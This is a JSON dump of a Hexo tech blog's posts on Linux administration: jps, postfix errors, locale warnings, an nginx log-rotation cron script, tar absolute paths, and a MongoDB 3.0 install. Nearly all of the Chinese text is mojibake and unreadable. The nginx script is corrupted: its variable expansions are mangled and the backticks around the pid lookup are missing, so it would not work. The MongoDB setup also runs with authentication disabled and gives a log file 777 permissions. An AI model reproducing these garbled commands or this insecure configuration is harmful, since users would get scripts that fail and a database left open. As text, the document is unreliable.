(æŸ¥çœ‹lså‘½ä»¤çš„å¸®åŠ©æ–‡æ¡£)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"hdfs","slug":"hdfs","permalink":"https://wangxiuwen.github.io/tags/hdfs/"}],"author":"wangxiuwen"},{"title":"jpså‘½ä»¤","slug":"history/tech/5953c4d0c2b92f5665eeda19","date":"2016-03-30T17:18:07.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda19/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda19/","excerpt":"","text":"jps(Java Virtual Machine Process Status Tool)æ˜¯JDK 1.5æä¾›çš„ä¸€ä¸ªæ˜¾ç¤ºå½“å‰æ‰€æœ‰javaè¿›ç¨‹pidçš„å‘½ä»¤ï¼Œç®€å•å®ç”¨ï¼Œéå¸¸é€‚åˆåœ¨linux/unixå¹³å°ä¸Šç®€å•å¯Ÿçœ‹å½“å‰javaè¿›ç¨‹çš„ä¸€äº›ç®€å•æƒ…å†µã€‚root@bogon:~# jps 1937 ResourceManager 2387 Jps 2212 Master","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"java","slug":"java","permalink":"https://wangxiuwen.github.io/tags/java/"}],"author":"wangxiuwen"},{"title":"mail cannot send message process exited with a non-zero status","slug":"history/tech/5953c4d0c2b92f5665eeda17","date":"2016-03-30T02:33:42.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda17/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda17/","excerpt":"","text":"æŠ¥é”™ä¿¡æ¯ï¼š12apt-get install mailutilsmail: cannot send message: process exited with a non-zero statusæœªè§£å†³ï¼š1touch /etc/postfix/main.cfå†æœï¼Œè§£å†³ï¼š1sudo dpkg-reconfigure postfix","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"ç™»é™†æœåŠ¡å™¨æç¤ºï¼šLC_CTYPE","slug":"history/tech/5953c4d0c2b92f5665eeda18","date":"2016-03-29T22:25:24.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda18/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda18/","excerpt":"","text":"warning: setlocale: LC_CTYPE: cannot change locale (UTF-8): No such file or directoryä¿®æ”¹ /etc/ssh_config æ–‡ä»¶ï¼Œæ³¨é‡Šï¼ˆ#ï¼‰å…¶ä¸­çš„ SendEnv LANG LC_*ç„¶åä¿å­˜é‡å¯ç»ˆç«¯é”™è¯¯æç¤ºå°±ä¸ä¼šåœ¨æ˜¾ç¤ºäº†ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"cacheSizeGB","slug":"history/tech/5953c4d0c2b92f5665eeda13","date":"2016-03-26T03:38:44.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda13/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda13/","excerpt":"","text":"cacheSizeGB æŒ‡çš„å°±æ˜¯Cache sizeï¼ŒåŒ…æ‹¬æ•°æ®å’Œç´¢å¼•ã€‚Mongodæœ¬èº«ä½¿ç”¨å†…å­˜å¦‚è¿æ¥æ± å †æ ˆä»¥åŠsorting bufferç­‰éƒ½æ˜¯é¢å¤–çš„ï¼Œä¸ä¼šè¢«ç»Ÿè®¡åˆ°è¿™ä¸ªæ•°å­—é‡Œé¢ã€‚å¦‚æœç´¢å¼•åœ¨å†…å­˜ï¼ŒæŸ¥è¯¢å†·æ•°æ®å–å†³äºä½ çš„IOèƒ½åŠ›ã€‚å¦‚æœIO latencyå¾ˆä½ï¼Œç³»ç»Ÿä¹Ÿæ²¡æœ‰æ˜¯é«˜è´Ÿè½½ï¼Œé‚£å“åº”æ—¶é—´åº”è¯¥æ˜¯æ¯«ç§’çº§çš„åŒºåˆ«ã€‚ä½†æ˜¯å¦‚æœæŸ¥è¯¢å¾ˆé¢‘ç¹ï¼Œåˆæ¶‰åŠåˆ°å¾ˆå¤šèŒƒå›´ã€æ‰¹é‡æŸ¥è¯¢ï¼ŒIOPSåˆè·Ÿä¸ä¸Šï¼Œé‚£å°±æœ‰å¯èƒ½åˆ°å‡ ç™¾å‡ åƒæ¯«ç§’éƒ½æœ‰å¯èƒ½ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"nginxæ—¥å¿—åˆ‡å‰²è„šæœ¬ å¹¶å‹ç¼©","slug":"history/tech/5953c4d0c2b92f5665eeda12","date":"2016-03-26T03:30:05.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda12/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda12/","excerpt":"","text":"ä¸€ã€è„šæœ¬æ€è·¯ç¬¬ä¸€æ­¥å°±æ˜¯é‡å‘½åæ—¥å¿—æ–‡ä»¶ï¼Œä¸ç”¨æ‹…å¿ƒé‡å‘½åånginxæ‰¾ä¸åˆ°æ—¥å¿—æ–‡ä»¶è€Œä¸¢å¤±æ—¥å¿—ã€‚åœ¨ä½ æœªé‡æ–°æ‰“å¼€åŸåå­—çš„æ—¥å¿—æ–‡ä»¶å‰ï¼Œnginxè¿˜æ˜¯ä¼šå‘ä½ é‡å‘½åçš„æ–‡ä»¶å†™æ—¥å¿—ï¼Œlinuxæ˜¯é æ–‡ä»¶æè¿°ç¬¦è€Œä¸æ˜¯æ–‡ä»¶åå®šä½æ–‡ä»¶ã€‚ç¬¬äºŒæ­¥å‘nginxä¸»è¿›ç¨‹å‘é€USR1ä¿¡å·ã€‚nginxä¸»è¿›ç¨‹æ¥åˆ°ä¿¡å·åä¼šä»é…ç½®æ–‡ä»¶ä¸­è¯»å–æ—¥å¿—æ–‡ä»¶åç§°ï¼Œé‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶(ä»¥é…ç½®æ–‡ä»¶ä¸­çš„æ—¥å¿—åç§°å‘½å)ï¼Œå¹¶ä»¥å·¥ä½œè¿›ç¨‹çš„ç”¨æˆ·ä½œä¸ºæ—¥å¿—æ–‡ä»¶çš„æ‰€æœ‰è€…ã€‚é‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶åï¼Œnginxä¸»è¿›ç¨‹ä¼šå…³é—­é‡åçš„æ—¥å¿—æ–‡ä»¶å¹¶é€šçŸ¥å·¥ä½œè¿›ç¨‹ä½¿ç”¨æ–°æ‰“å¼€çš„æ—¥å¿—æ–‡ä»¶ã€‚å·¥ä½œè¿›ç¨‹ç«‹åˆ»æ‰“å¼€æ–°çš„æ—¥å¿—æ–‡ä»¶å¹¶å…³é—­é‡ååçš„æ—¥å¿—æ–‡ä»¶ã€‚ç„¶åä½ å°±å¯ä»¥å¤„ç†æ—§çš„æ—¥å¿—æ–‡ä»¶äº†ã€‚**äºŒã€è„šæœ¬å®ç°**nginxæ—¥å¿—æŒ‰æ—¥æœŸè‡ªåŠ¨åˆ‡å‰²è„šæœ¬å¦‚ä¸‹ï¼š#nginxæ—¥å¿—åˆ‡å‰²è„šæœ¬#!/bin/bash#è®¾ç½®æ—¥å¿—æ–‡ä»¶å­˜æ”¾ç›®å½•logs_path=&quot;/usr/local/nginx/logs/&quot;#è®¾ç½®pidæ–‡ä»¶pid_path=&quot;/usr/local/nginx/logs/nginx.pid&quot;date_str=access_$(date -d â€œyesterdayâ€ +&quot;%Y%m%d&quot;)#é‡å‘½åæ—¥å¿—æ–‡ä»¶mv ${logs_path}access.log logspath{logs_path}logsâ€‹pâ€‹â€‹ath{date_str}.log#å‘nginxä¸»è¿›ç¨‹å‘ä¿¡å·é‡æ–°æ‰“å¼€æ—¥å¿—kill -USR1 cat ${pid_path}#å‹ç¼©æ—¥å¿—tar -zcf logspath{logs_path}logsâ€‹pâ€‹â€‹ath{date_str}.tar.gz logspath{logs_path}logsâ€‹pâ€‹â€‹ath{date_str}.logrm -f logspath{logs_path}logsâ€‹pâ€‹â€‹ath{date_str}.logä¿å­˜ä»¥ä¸Šè„šæœ¬nginx_log.shï¼Œå¹¶è®¾ç½®å®šæ—¶åˆ‡å‰²ä»»åŠ¡ä¸‰ã€å®šæ—¶å·¥ä½œåœ¨crontabä¸­è®¾ç½®ä½œä¸š0 0 * * * root /usr/local/nginx/nginx_log.shè¿™æ ·å°±æ¯å¤©çš„0ç‚¹0åˆ†æŠŠnginxæ—¥å¿—é‡å‘½åä¸ºæ—¥æœŸæ ¼å¼ï¼Œå¹¶é‡æ–°ç”Ÿæˆä»Šå¤©çš„æ–°æ—¥å¿—æ–‡ä»¶ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nginx","slug":"nginx","permalink":"https://wangxiuwen.github.io/tags/nginx/"}],"author":"wangxiuwen"},{"title":"unix ç³»ç»Ÿæ‰“åŒ…ä½¿ç”¨ç»å¯¹è·¯å¾„","slug":"history/tech/5953c4d0c2b92f5665eeda11","date":"2016-03-26T03:17:49.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda11/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda11/","excerpt":"","text":"é¦–å…ˆåº”è¯¥æ˜ç¡®ï¼š*nixç³»ç»Ÿä¸­ï¼Œä½¿ç”¨tarå¯¹æ–‡ä»¶æ‰“åŒ…æ—¶ï¼Œä¸€èˆ¬ä¸å»ºè®®ä½¿ç”¨ç»å¯¹è·¯å¾„ã€‚é€šå¸¸æ˜¯åœ¨ä¸¤å°ç¯å¢ƒç›¸ä¼¼çš„æœºå™¨ä¸Šè¿›è¡ŒåŒæ­¥å¤åˆ¶çš„æ—¶å€™ï¼Œæ‰æœ‰éœ€è¦ä½¿ç”¨ç»å¯¹è·¯å¾„è¿›è¡Œæ‰“åŒ…ã€‚ä½¿ç”¨ç»å¯¹è·¯å¾„æ‰“åŒ…æ—¶å¦‚æœä¸æŒ‡å®šç›¸åº”çš„å‚æ•°ï¼Œtarä¼šäº§ç”Ÿä¸€å¥è­¦å‘Šä¿¡æ¯ï¼šâ€tar: Removing leading `/â€™ from member namesâ€ï¼Œå¹¶ä¸”å®é™…äº§ç”Ÿçš„å‹ç¼©åŒ…ä¼šå°†ç»å¯¹è·¯å¾„è½¬åŒ–ä¸ºç›¸å¯¹è·¯å¾„ã€‚æ¯”å¦‚ï¼š1234567891011root@queen ~ # tar -czvf robin.tar.gz /home/robin tar: Removing leading `/&apos; from member names /home/robin/ /home/robin/file1 /home/robin/file2 /home/robin/file3 root@queen ~ # tar -tzvf robin.tar.gz drwxr-xr-x robin/root 0 2009-11-10 18:51:31 home/robin/ -rw-r--r-- robin/root 0 2009-11-10 18:51:28 home/robin/file1 -rw-r--r-- robin/root 0 2009-11-10 18:51:30 home/robin/file2 -rw-r--r-- robin/root 0 2009-11-10 18:51:31 home/robin/file3è¿™æ ·çš„ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå¦‚æœæˆ‘ä»¬å†å»è§£å¼€ï¼Œå°±ä¼šå½“å‰ç›®å½•ï¼ˆä¹Ÿå³æ­¤ä¾‹ä¸­çš„â€œ~â€ï¼‰ä¸‹å†æ–°å»ºå‡ºâ€œ./home/robin/â€ ä¸¤çº§ç›®å½•ã€‚å¯¹äºè¿™æ ·çš„å‹ç¼©åŒ…ï¼Œè§£å‹æ–¹æ³•æ˜¯ä½¿ç”¨å‚æ•° â€œ-Câ€æŒ‡è§£å‹çš„ç›®å½•ä¸ºæ ¹ç›®å½•ï¼ˆâ€œ/â€ï¼‰ï¼štar -xzvf robin.tar.gz -C /æ›´ä¸ºå¯é çš„æ–¹æ³•æ˜¯åœ¨æ‰“åŒ…å’Œè§£å¼€çš„æ—¶å€™éƒ½ä½¿ç”¨å‚æ•° -Pï¼š1234567891011121314151617root@queen ~ # tar -czvPf robin.tar.gz /home/robin/ /home/robin/ /home/robin/file1 /home/robin/file2 /home/robin/file3 root@queen ~ # tar tzvf robin.tar.gz drwxr-xr-x robin/root 0 2009-11-10 18:51:31 /home/robin/ -rw-r--r-- robin/root 0 2009-11-10 18:51:28 /home/robin/file1 -rw-r--r-- robin/root 0 2009-11-10 18:51:30 /home/robin/file2 -rw-r--r-- robin/root 0 2009-11-10 18:51:31 /home/robin/file3 root@queen ~ # tar -xzvPf robin.tar.gz /home/robin/ /home/robin/file1 /home/robin/file2 /home/robin/file3 root@queen ~ #","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"mongodb å®‰è£…","slug":"history/tech/5953c4d0c2b92f5665eeda10","date":"2016-03-26T02:48:03.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda10/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda10/","excerpt":"","text":"ä»MongoDB3.0ç‰ˆèµ·ï¼Œå…¶å®‰è£…åŒ…æ¯”ä»¥å‰æ›´ç»†åŒ–ï¼Œæœ‰çš„æœ‹å‹å¯èƒ½ä¸å¤ªäº†è§£åŒºåˆ«ï¼Œç®€å•è¯´æ˜ä¸€ä¸‹:Linux 64-bit legacy è¿™ä¸ªç‰ˆæœ¬å³mongodb-linux-x86_64-3.0.1.tgz ä¸æ¨èåœ¨æ­£å¼ç¯å¢ƒä½¿ç”¨ï¼Œè¿™ä¸ªç‰ˆæœ¬ç‰¹ç‚¹æ˜¯æ²¡æœ‰è¿æ¥sslç›¸å…³çš„åº“ï¼Œå¹¶ä¸”å¯èƒ½ç¼ºå°‘é’ˆå¯¹æ“ä½œç³»ç»Ÿçš„ä¸€äº›æ€§èƒ½ä¼˜åŒ–ï¼Œä½†æ˜¯å¯ä»¥æµ‹è¯•ç”¨ï¼Œå®‰è£…ç®€å•ã€‚æ¨èæŒ‰ç›¸åº”æ“ä½œç³»ç»Ÿç‰ˆæœ¬é€‰æ‹©å¯¹åº”çš„å®‰è£…åŒ…å¦‚centos6 rhel6é€‰æ‹©RHEL 6 Linux 64-bitï¼Œå³mongodb-linux-x86_64-rhel62-3.0.1.tgzè¿™ä¸ªå®‰è£…åŒ…ã€‚æ ¹æ®æœåŠ¡å™¨çš„ç¡¬ç›˜æƒ…å†µï¼Œå…¶ä¸­/homeä¸ºå›ºæ€ç›˜ï¼Œ/dataä¸ºå›ºæ€ç›˜ /storageä¸ºæœºæ¢°ç›˜ df -lhFilesystem Size Used Avail Use% Mounted on/dev/sda2 197G 1.6G 186G 1% /tmpfs 63G 0 63G 0% /dev/shm/dev/sda1 380M 70M 290M 20% /boot/dev/sdb1 733G 197M 696G 1% /data/dev/sda5 410G 235M 389G 1% /home/dev/sdc1 9.0T 40M 8.5T 1% /storageå®‰è£…openssl#yum install -y openssl-devel openssl wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel62-3.0.1.tgz tar xzvf mongodb-linux-x86_64-rhel62-3.0.1.tgz mkdir -p /home/local/ mv mongodb-linux-x86_64-rhel62-3.0.1 /home/local/mongodb mkdir -p /data/mongodb mkdir -p /data/logs/mongodb touch /data/logs/mongodb/mongodb.log chmod -R 777 /data/logs/mongodb/mongodb.logè®¾ç½®ulimit -nå’Œulimit -uçš„å€¼å¤§äº20000ã€‚å¦‚æœulimitçš„å€¼è®¾ç½®è¿‡ä½çš„è¯ï¼Œå½“MongoDBå¤„äº é¢‘ç¹è®¿é—®çš„çŠ¶æ€ä¸‹ï¼Œå°†ä¼šäº§ç”Ÿé”™è¯¯ï¼Œæœ€ç»ˆå¯¼è‡´æ— æ³•è¿æ¥åˆ°MongoDBå®ä¾‹ã€‚ ulimit -n 25000 ulimit -u 25000 cd /home/local/mongodb/bin/ vi mongodb.confport=20000 #ç«¯å£dbpath= /data/mongodb #æ•°æ®æ–‡ä»¶å­˜æ”¾ç›®å½•logpath=/data/logs/mongodb/mongodb.log #æ—¥å¿—æ–‡ä»¶å­˜æ”¾ç›®å½•logappend=true #ä½¿ç”¨è¿½åŠ çš„æ–¹å¼å†™æ—¥å¿—fork=true #ä»¥å®ˆæŠ¤ç¨‹åºçš„æ–¹å¼å¯ç”¨ï¼Œå³åœ¨åå°è¿è¡ŒmaxConns=5000 #æœ€å¤§åŒæ—¶è¿æ¥æ•° é»˜è®¤2000bind_ip=127.0.0.1,172.16.20.126 #åªå…è®¸é€šè¿‡å±€åŸŸç½‘IPï¼š172.16.20.126åŠæœ¬æœºè®¿é—®noauth=true #ä¸å¯ç”¨éªŒè¯nohttpinterface=truerest=falseè®¾ç½®é˜²ç«å¢™ï¼Œä»¥ä¾¿å±€åŸŸç½‘å†…çš„å…¶å®ƒæœåŠ¡å™¨å¯ä»¥è®¿é—®vi /etc/sysconfig/iptables-A INPUT -m state --state NEW -m tcp -p tcp --dport 20000 -j ACCEPT/etc/init.d/iptables restartå¦‚æœæ²¡æœ‰numactlå‘½ä»¤ï¼Œä½¿ç”¨yumå®‰è£…yum install -y numactlåœ¨procä¸­å…³é—­NUMA echo 0 &gt; /proc/sys/vm/zone_reclaim_mode sysctl -w vm.zone_reclaim_mode=0å¯åŠ¨å‘½ä»¤ï¼š numactl --interleave=all /home/local/mongodb/bin/mongod --config /home/local/mongodb/bin/mongodb.confæˆ– numactl --interleave=all /home/local/mongodb/bin/mongod -f /home/local/mongodb/bin/mongodb.confabout to fork child process, waiting until server is ready for connections.forked process: 25071child process started successfully, parent exitingæ­£å¸¸åœæ­¢æ–¹æ³•: ps aux | grep mongod kill -2 PIDæˆ– /home/local/mongodb/bin/mongo -port 20000use admindb.shutdownServer();2015-03-19T00:43:27.760+0800 I CONTROL ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is â€˜alwaysâ€™.2015-03-19T00:43:27.760+0800 I CONTROL ** We suggest setting it to â€˜neverâ€™ä¸é‡å¯æœåŠ¡å™¨çš„æƒ…å†µä¸‹è§£å†³åŠæ³•,åœ¨Linuxä¸‹æ‰§è¡Œï¼šecho never &gt; /sys/kernel/mm/transparent_hugepage/enabledecho never &gt; /sys/kernel/mm/transparent_hugepage/defragæœåŠ¡å™¨é‡å¯åç«‹å³ç”Ÿæ•ˆåŠæ³•ï¼š vi /etc/rc.localif test -f /sys/kernel/mm/transparent_hugepage/enabled; thenecho never &gt; /sys/kernel/mm/transparent_hugepage/enabledfiif test -f /sys/kernel/mm/transparent_hugepage/defrag; thenecho never &gt; /sys/kernel/mm/transparent_hugepage/defragfiå¼€æœºè‡ªåŠ¨å¯åŠ¨mongodb vi /etc/rc.d/rc.localrm -rf /data/mongodb/mongod.locknumactl --interleave=all /home/local/mongodb/bin/mongod -f /home/local/mongodb/bin/mongodb.confè¯´æ˜ï¼šå¯åŠ¨æ—¶å¿…é¡»åŠ numactl --interleave=alläºŒã€MongoDB 3.0å®‰è£…é…ç½®faqhttp://webprox.redstonesrv.fr/browse.php/qU6OBihY/_2BTWuWx/rLZNRESq/MIu7der5/ISEOTGe5/jncv4QuE/LSbDvehs/W0d3g_3D/b29/MongoDB 3.0ç‰ˆæœ¬å®‰è£…ä»‹è´¨MongoDB 3.0ç‰ˆæœ¬å®‰è£…åŒ…æ¯”ä»¥å‰æ›´ç»†åŒ–ï¼Œæœ‰çš„æœ‹å‹å¯èƒ½ä¸å¤ªäº†è§£åŒºåˆ«ï¼Œç®€å•è¯´æ˜ä¸€ä¸‹:Linux 64-bit legacy è¿™ä¸ªç‰ˆæœ¬å³mongodb-linux-x86_64-3.0.0.tgz ä¸æ¨èåœ¨æ­£å¼ç¯å¢ƒä½¿ç”¨ï¼Œè¿™ä¸ªç‰ˆæœ¬ç‰¹ç‚¹æ˜¯æ²¡æœ‰è¿æ¥sslç›¸å…³çš„åº“ï¼Œå¹¶ä¸”å¯èƒ½ç¼ºå°‘é’ˆå¯¹æ“ä½œç³»ç»Ÿçš„ä¸€äº›æ€§èƒ½ä¼˜åŒ–ï¼Œä½†æ˜¯å¯ä»¥æµ‹è¯•ç”¨ï¼Œå®‰è£…ç®€å•ã€‚æ¨èæŒ‰ç›¸åº”æ“ä½œç³»ç»Ÿç‰ˆæœ¬é€‰æ‹©å¯¹åº”çš„å®‰è£…åŒ…å¦‚centos6 rhel6é€‰æ‹©RHEL 6 Linux 64-bitï¼Œå³mongodb-linux-x86_64-rhel62-3.0.0.tgzè¿™ä¸ªå®‰è£…åŒ…ã€‚æœ‰æœ‹å‹ååº”å®‰è£…ä¸ä¸Šï¼Œå› ä¸ºè¿˜éœ€è¦å®‰è£…ç›¸åº”çš„ä¾èµ–åº“å¦‚OpenSSL ç›¸å…³çš„åº“ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œå°±æ˜¯ç¼ºå°‘OpenSSL ç›¸å…³çš„åº“ldd mongodb-linux-x86_64-rhel62-3.0.0/bin/mongodmongodb-linux-x86_64-rhel62-3.0.0/bin/mongod: /usr/lib64/libssl.so.10: no version information available (required by mongodb-linux-x86_64-rhel62-3.0.0/bin/mongod)mongodb-linux-x86_64-rhel62-3.0.0/bin/mongod: /usr/lib64/libcrypto.so.10: no version information available (required by mongodb-linux-x86_64-rhel62-3.0.0/bin/mongod)mongodb-linux-x86_64-rhel62-3.0.0/bin/mongod: /usr/lib64/libcrypto.so.10: no version information available (required by mongodb-linux-x86_64-rhel62-3.0.0/bin/mongod)linux-vdso.so.1 =&gt; (0x00007ffffd961000)libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x0000003d5b600000)libssl.so.10 =&gt; /usr/lib64/libssl.so.10 (0x0000003d62e00000)libcrypto.so.10 =&gt; /usr/lib64/libcrypto.so.10 (0x0000003d60e00000)librt.so.1 =&gt; /lib64/librt.so.1 (0x0000003d5be00000)libdl.so.2 =&gt; /lib64/libdl.so.2 (0x0000003d5ae00000)libstdc++.so.6 =&gt; /usr/lib64/libstdc++.so.6 (0x00000039bc800000)libm.so.6 =&gt; /lib64/libm.so.6 (0x0000003d5ba00000)libgcc_s.so.1 =&gt; /lib64/libgcc_s.so.1 (0x0000003d5ce00000)libc.so.6 =&gt; /lib64/libc.so.6 (0x0000003d5b200000)/lib64/ld-linux-x86-64.so.2 (0x0000003d5aa00000)libgssapi_krb5.so.2 =&gt; /lib64/libgssapi_krb5.so.2 (0x0000003d61a00000)libkrb5.so.3 =&gt; /lib64/libkrb5.so.3 (0x0000003d60a00000)libcom_err.so.2 =&gt; /lib64/libcom_err.so.2 (0x0000003d5e200000)libk5crypto.so.3 =&gt; /lib64/libk5crypto.so.3 (0x0000003d60600000)libz.so.1 =&gt; /lib64/libz.so.1 (0x0000003d5c200000)libkrb5support.so.0 =&gt; /lib64/libkrb5support.so.0 (0x0000003d61e00000)libkeyutils.so.1 =&gt; /lib64/libkeyutils.so.1 (0x0000003d60200000)libresolv.so.2 =&gt; /lib64/libresolv.so.2 (0x0000003d5d600000)libselinux.so.1 =&gt; /lib64/libselinux.so.1 (0x0000003d5ca00000)å®‰è£…å¥½å[root(/user/ccj-sf) export]# ldd /export/mongodb/bin/mongodlinux-vdso.so.1 =&gt; (0x00007fff8f7ff000)libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007f6e0d5a9000)libssl.so.10 =&gt; /usr/lib64/libssl.so.10 (0x00007f6e0d33d000)libcrypto.so.10 =&gt; /usr/lib64/libcrypto.so.10 (0x00007f6e0cf59000)librt.so.1 =&gt; /lib64/librt.so.1 (0x00007f6e0cd51000)libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007f6e0cb4d000)libstdc++.so.6 =&gt; /usr/lib64/libstdc++.so.6 (0x00007f6e0c846000)libm.so.6 =&gt; /lib64/libm.so.6 (0x00007f6e0c5c2000)libgcc_s.so.1 =&gt; /lib64/libgcc_s.so.1 (0x00007f6e0c3ac000)libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f6e0c017000)/lib64/ld-linux-x86-64.so.2 (0x00007f6e0d7cf000)libgssapi_krb5.so.2 =&gt; /lib64/libgssapi_krb5.so.2 (0x00007f6e0bdd3000)libkrb5.so.3 =&gt; /lib64/libkrb5.so.3 (0x00007f6e0baed000)libcom_err.so.2 =&gt; /lib64/libcom_err.so.2 (0x00007f6e0b8e8000)libk5crypto.so.3 =&gt; /lib64/libk5crypto.so.3 (0x00007f6e0b6bc000)libz.so.1 =&gt; /lib64/libz.so.1 (0x00007f6e0b4a6000)libkrb5support.so.0 =&gt; /lib64/libkrb5support.so.0 (0x00007f6e0b29a000)libkeyutils.so.1 =&gt; /lib64/libkeyutils.so.1 (0x00007f6e0b097000)libresolv.so.2 =&gt; /lib64/libresolv.so.2 (0x00007f6e0ae7d000)libselinux.so.1 =&gt; /lib64/libselinux.so.1 (0x00007f6e0ac5d000)é…ç½®æ–‡ä»¶mmapv1å¼•æ“ï¼Œé…ç½®æ–‡ä»¶ä¸2.xç‰ˆæœ¬å®Œå…¨ç›¸åŒã€‚å¦‚ï¼š cat mongod.cnf dbpath=/export/data/mongodb30/mongodlogpath=/export/data/mongodb30/log/mongod.logpidfilepath=/export/data/mongodb30/pid/mongod.piddirectoryperdb=truereplSet=a3logappend=truekeyFile=/export/data/mongodb30/keyport=20000fork=truewireTigerå¼•æ“é…ç½®å¢åŠ ç›¸å…³å‚æ•°å³å¯ï¼Œä»¥å‰¯æœ¬é›†ä¸ºä¾‹ï¼Œå¦‚ï¼š cat mongod.cnf dbpath=/export/data/mongodb30/mongodlogpath=/export/data/mongodb30/log/mongod.logpidfilepath=/export/data/mongodb30/pid/mongod.piddirectoryperdb=truereplSet=a3logappend=truekeyFile=/export/data/mongodb30/keyport=20000fork=truestorageEngine=wiredTigerwiredTigerCacheSizeGB=10wiredTigerStatisticsLogDelaySecs=0wiredTigerJournalCompressor=snappywiredTigerDirectoryForIndexes=truewiredTigerCollectionBlockCompressor=snappywiredTigerIndexPrefixCompression=1YAML æ ¼å¼é…ç½®æ–‡ä»¶ï¼š2.6ç‰ˆæœ¬å°±å¼•å…¥,ä»¥ä¸Šé¢å‰¯æœ¬é›†ä¸ºä¾‹ï¼š$ cat mongodb.cnf systemLog: destination: file path: /export/data/mongodb30/log/mongod.log logAppend: truestorage: journal: enabled: true dbPath: /export/data/mongodb30/mongod directoryPerDB: true engine: wiredTiger wiredTiger: engineConfig: cacheSizeGB: 10 directoryForIndexes: true collectionConfig: blockCompressor: snappy indexConfig: prefixCompression: truenet: port: 20000replication: replSetName: a3 security: keyFile: /export/data/mongodb30/keyprocessManagement: pidFilePath: /export/data/mongodb30/pid/mongod.pid fork: true setParameter: enableLocalhostAuthBypass: falseå•æœºå»æ‰replicationåŠkeyfileè®¾ç½®å³å¯ï¼Œåˆ†ç‰‡å¢åŠ ä¸€äº›å‚æ•°ï¼Œå¦‚ï¼šmongodå¢åŠ sharding: clusterRole: shardsvrconfiger serversharding: clusterRole: 